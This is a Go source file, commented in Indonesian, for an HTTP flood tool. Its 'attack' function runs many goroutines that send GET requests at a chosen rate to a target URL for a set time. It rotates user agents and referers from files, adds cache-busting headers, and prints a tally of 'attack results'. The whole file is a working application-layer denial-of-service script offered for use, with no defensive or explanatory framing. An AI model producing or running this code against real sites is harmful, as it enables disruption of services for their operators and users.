package main

import (
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"github.com/valyala/fasthttp"
)

var (
	userAgents        []string
	referers          []string
	successCount      uint64
	errorCount        uint64
	statusCodes       = make(map[int]uint64)
	mutex             sync.Mutex
	http1RequestCount uint64
	http2RequestCount uint64
)

func init() {
	rand.Seed(time.Now().UnixNano())
	userAgents = readLines("ua.txt")
	referers = readLines("referers.txt")
}

func readLines(filename string) []string {
	content, err := os.ReadFile(filename)
	if err != nil {
		fmt.Printf("Error membaca file %s: %v\n", filename, err)
		os.Exit(1)
	}
	return splitLines(string(content))
}

func splitLines(data string) []string {
	lines := []string{}
	for _, line := range split(data, '\n') {
		lines = append(lines, line)
	}
	return lines
}

func split(s string, sep rune) []string {
	var res []string
	lastIndex := 0
	for i, c := range s {
		if c == sep {
			res = append(res, s[lastIndex:i])
			lastIndex = i + 1
		}
	}
	if lastIndex < len(s) {
		res = append(res, s[lastIndex:])
	}
	return res
}

func randomElement(elements []string) string {
	if len(elements) == 0 {
		return ""
	}
	return elements[rand.Intn(len(elements))]
}

func attack(targetURL string, client *fasthttp.Client, duration time.Duration, rps int, wg *sync.WaitGroup) {
	defer wg.Done()

	startTime := time.Now()
	interval := time.Second / time.Duration(rps)

	// Langsung semua worker jalan
	for time.Since(startTime) < duration {
		req := fasthttp.AcquireRequest()
		resp := fasthttp.AcquireResponse()

		req.SetRequestURI(targetURL)
		req.Header.Set("User-Agent", randomElement(userAgents))
		req.Header.Set("Referer", randomElement(referers))
		req.Header.Set("Pragma", "no-cache")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("accept-encoding", "gzip, deflate, br")
    req.Header.Set("Connection", "keep-alive")

		err := client.Do(req, resp)
		if err != nil {
			atomic.AddUint64(&errorCount, 1)
		} else {
			atomic.AddUint64(&successCount, 1)
			statusCode := resp.StatusCode()
			mutex.Lock()
			statusCodes[statusCode]++
			mutex.Unlock()
		}

		fasthttp.ReleaseRequest(req)
		fasthttp.ReleaseResponse(resp)

		time.Sleep(interval) // Tunggu sesuai RPS
	}
}

func main() {
	if len(os.Args) < 5 {
		fmt.Println("Usage: go run held.go <target> <duration> <threads> <rps>")
		fmt.Println("Contoh: go run held.go https://example.com 10 20 100")
		os.Exit(1)
	}

	target := os.Args[1]
	duration, _ := time.ParseDuration(os.Args[2] + "s")

	threads, err := strconv.Atoi(os.Args[3])
	if err != nil || threads <= 0 {
		fmt.Println("Threads harus angka positif")
		os.Exit(1)
	}

	rps, err := strconv.Atoi(os.Args[4])
	if err != nil || rps <= 0 {
		fmt.Println("RPS harus angka positif")
		os.Exit(1)
	}

	// Buat client HTTP dengan Keep-Alive
	client := &fasthttp.Client{
		MaxConnsPerHost: threads * 2,
	}

	var wg sync.WaitGroup
	wg.Add(threads) // Tambahkan semua worker ke WaitGroup

	// Langsung semua worker jalan bersamaan
	for i := 0; i < threads; i++ {
		go attack(target, client, duration, rps, &wg)
	}

	wg.Wait()

	fmt.Println("\n=== Hasil Serangan ===")
	fmt.Printf("Total request terkirim : %d\n", successCount+errorCount)
	fmt.Printf("Request sukses         : %d\n", successCount)
	fmt.Printf("Request gagal          : %d\n", errorCount)
	fmt.Println("\nStatus Code Diterima:")
	for code, count := range statusCodes {
		fmt.Printf("  %d : %d kali\n", code, count)
	}
}
